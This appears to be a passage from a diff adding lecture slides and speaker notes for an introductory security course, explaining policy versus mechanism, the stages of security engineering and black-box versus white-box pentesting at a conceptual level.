+The mechanism is how you get there. A guard at the door asking for your ID card is a mechanism, and it's not technical at all. Part of our trust model is trusting that the mechanisms really implement the policy.
+
+If a question gives you something like "RBAC" or "turnstiles" and asks what it is: mechanism. "Users must change their password every 90 days": policy.
+
+</Notes>
+</Slide>
+
+<Slide title="Security engineering">
+
+## Security engineering
+
+<Flow
+  items={[
+    "I · Define the problem|requirements, threat model",
+    "II · Trust model and solution|policies (what) + mechanisms (how)",
+    "III · Validate|the attacker won't follow your model",
+  ]}
+/>
+
+<Step at={1}>
+
+<p class="big">Security comes in <strong>layers</strong>: physical · network · systems · software · data and cryptography.</p>
+
+</Step>
+
+<Step at={2}>
+
+<p class="big"><strong>Pentesting</strong> validates empirically. <em>Black box</em> simulates a real attack; <em>white box</em> uses insider knowledge. The value is in the <strong>report</strong>.</p>
+
+</Step>
+
+<Notes>
+
+Security engineering is building trust through rigorous arguments, not hoping. Three stages.
+
+One, define the problem: the security requirements and the threat model, meaning the assets, the goals and the classes of adversaries.
+
+Two, define the trust model, which components we trust and for what, and the solution: the policies, which are the what, and mechanisms that are necessary and sufficient, which are the how.
+
+Three, validate. Check the trust model fits the real system, because the adversary is not forced to follow your threat model. And show that the mechanisms, together with your assumptions, are enough to implement the policies. A security audit checks this whole process.
+
+**[→]** In complex systems this is done in layers, and the course follows them: software, then systems, then web.
+
+**[→]** Pentesting is ethical hacking: you simulate an attack to find what a real adversary could exploit. Black box means you start with nothing, like a real outsider. White box means you get the source code and the documentation. Either way, what the client pays for is the report and its recommendations.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+</Part>
